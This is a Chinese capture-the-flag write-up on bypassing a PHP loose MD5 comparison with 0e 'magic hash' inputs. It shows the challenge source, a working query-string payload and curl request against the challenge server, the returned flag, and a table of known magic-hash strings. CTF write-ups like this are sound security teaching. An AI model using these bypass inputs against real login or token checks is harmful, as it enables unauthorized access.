# WP · qsnctf 40724 — MD5 弱比较 + 0e 魔法哈希（带约束版）

> 类型：PHP 弱比较（`==`）/ MD5 魔法哈希
> 技术栈：nginx/1.18.0 + PHP/7.2.34
> 难度：入门（开卷源码）

## 一、题目信息
- 地址：`http://challenge.qsnctf.com:40724/`
- 入口：`?v1=&v2=` 两个 GET 参数。

## 二、信息收集（开卷源码）
```php
$flag = getenv('FLAG');          // flag 在环境变量里，不直接输出

$v1 = $_GET['v1'];
$v2 = $_GET['v2'];

if (isset($v1) && isset($v2)) {
    if (!ctype_alpha($v1)) die("v1 error");   // ① v1 必须全是字母
    if (!is_numeric($v2)) die("v2 error");    // ② v2 必须是数字
    if (md5($v1) == md5($v2)) echo $flag;     // ③ 两个 MD5 宽松比较相等
}
```

## 三、漏洞分析
- ③ 用的是 **`==`（宽松比较）**，不是 `===`。
- 如果两个 MD5 都是 `0e<数字>` 形式，PHP 会把它们当**科学计数法**：`0e123` = 0×10¹²³ = **0**。于是 `0 == 0` → 成立。
- 这种"MD5 以 0e 开头"的输入叫**魔法哈希（magic hash）**，有现成的已知串。
- 难点：① 和 ② 把输入卡死了——v1 只能字母、v2 只能数字。正好有已知魔法哈希完美对上：
  - `md5('QNKCDZO')` = `0e830400451993494058024219903391`（纯字母 ✅）
  - `md5('240610708')` = `0e462097431906509019562988736854`（纯数字 ✅）

## 四、利用 payload
```
?v1=QNKCDZO&v2=240610708
```
```bash
curl "http://challenge.qsnctf.com:40724/?v1=QNKCDZO&v2=240610708"
```

返回：

```
flag{2dd7aea2e9ca4333b0c83bb634e20aaa}
```

## 五、复盘 & 套路沉淀
- **核心心法**：看到哈希比较，先看是 `==` 还是 `===`。
  - `==`（宽松）：0e 魔法哈希 / 数组绕过（md5(数组)=null）都行；
  - `===`（严格）：只能真碰撞或数组绕过。
- **本解为什么不能用数组**：`v1[]=1&v2[]=2` 也能让 md5 都为 null（null===null），但 `ctype_alpha(数组)` 和 `is_numeric(数组)` 会直接返回 false → 死在第一二关。**约束条件决定了绕过方式**。
- **常用魔法哈希表（背下来）**：
  | 输入 | md5 |
  |---|---|
  | `QNKCDZO` | `0e830400451993494058024219903391` |
  | `240610708` | `0e462097431906509019562988736854` |
  | `s878926199a` | `0e545993274517709034328855841020` |
  | `s155964671a` | `0e342768416822977524854789101267` |
- **兄弟题家族**：TYctf（sha1 弱比较 + 数组）、本 MD5 版；都归"哈希弱比较绕过"。
